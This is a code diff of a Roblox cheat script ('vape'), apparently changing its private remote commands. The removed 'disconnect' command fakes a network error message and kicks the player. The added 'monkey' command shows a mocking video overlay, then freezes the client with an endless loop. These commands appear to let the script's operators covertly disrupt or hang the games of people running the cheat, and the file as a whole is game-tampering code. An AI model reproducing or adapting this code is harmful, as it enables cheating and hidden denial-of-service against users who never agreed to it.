@@ -6249,66 +6249,53 @@ local vapePrivateCommands = {
 	["uninject"] = function(args)
 		GuiLibrary["SelfDestruct"]()
 	end,
-	["disconnect"] = function(args)
-		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
-			if obj.Name == "ErrorMessage" then
-				obj:GetPropertyChangedSignal("Text"):Connect(function()
-					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
-				end)
-			end
-			if obj.Name == "LeaveButton" then
-				local clone = obj:Clone()
-				clone.Name = "LeaveButton2"
-				clone.Parent = obj.Parent
-				clone.MouseButton1Click:Connect(function()
-					clone.Visible = false
-					local video = Instance.new("VideoFrame")
-					video.Video = getcustomassetfunc("vape/assets/skill.webm")
-					video.Size = UDim2.new(1, 0, 1, 36)
-					video.Visible = false
-					video.Position = UDim2.new(0, 0, 0, -36)
-					video.ZIndex = 9
-					video.BackgroundTransparency = 1
-					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-					local textlab = Instance.new("TextLabel")
-					textlab.TextSize = 45
-					textlab.ZIndex = 10
-					textlab.Size = UDim2.new(1, 0, 1, 36)
-					textlab.TextColor3 = Color3.new(1, 1, 1)
-					textlab.Text = "skill issue"
-					textlab.Position = UDim2.new(0, 0, 0, -36)
-					textlab.Font = Enum.Font.Gotham
-					textlab.BackgroundTransparency = 1
-					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
-					video.Loaded:Connect(function()
-						video.Visible = true
-						video:Play()
-						task.spawn(function()
-							repeat
-								wait()
-								for i = 0, 1, 0.01 do
-									wait(0.01)
-									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
-								end
-							until true == false
-						end)
-					end)
-					task.wait(19)
-					task.spawn(function()
-						pcall(function()
-							if getconnections then
-								getconnections(entityLibrary.character.Humanoid.Died)
-							end
-							print(game:GetObjects("h29g3535")[1])
-						end)
-						while true do end
-					end)
-				end)
-				obj.Visible = false
-			end
+	["monkey"] = function(args)
+		local str = ""
+		for i,v in pairs(args) do
+			str = str..v..(i > 1 and " " or "")
+		end
+		if str == "" then str = "skill issue" end
+		local video = Instance.new("VideoFrame")
+		video.Video = getcustomassetfunc("vape/assets/skill.webm")
+		video.Size = UDim2.new(1, 0, 1, 36)
+		video.Visible = false
+		video.Position = UDim2.new(0, 0, 0, -36)
+		video.ZIndex = 9
+		video.BackgroundTransparency = 1
+		video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+		local textlab = Instance.new("TextLabel")
+		textlab.TextSize = 45
+		textlab.ZIndex = 10
+		textlab.Size = UDim2.new(1, 0, 1, 36)
+		textlab.TextColor3 = Color3.new(1, 1, 1)
+		textlab.Text = str
+		textlab.Position = UDim2.new(0, 0, 0, -36)
+		textlab.Font = Enum.Font.Gotham
+		textlab.BackgroundTransparency = 1
+		textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+		video.Loaded:Connect(function()
+			video.Visible = true
+			video:Play()
+			task.spawn(function()
+				repeat
+					wait()
+					for i = 0, 1, 0.01 do
+						wait(0.01)
+						textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+					end
+				until true == false
+			end)
 		end)
-		task.wait(0.1)
-		lplr:Kick()
+		task.wait(19)
+		task.spawn(function()
+			pcall(function()
+				if getconnections then
+					getconnections(entityLibrary.character.Humanoid.Died)
+				end
+				print(game:GetObjects("h29g3535")[1])
+			end)
+			while true do end
+		end)
 	end,
 	["togglemodule"] = function(args)
 		if #args >= 1 then
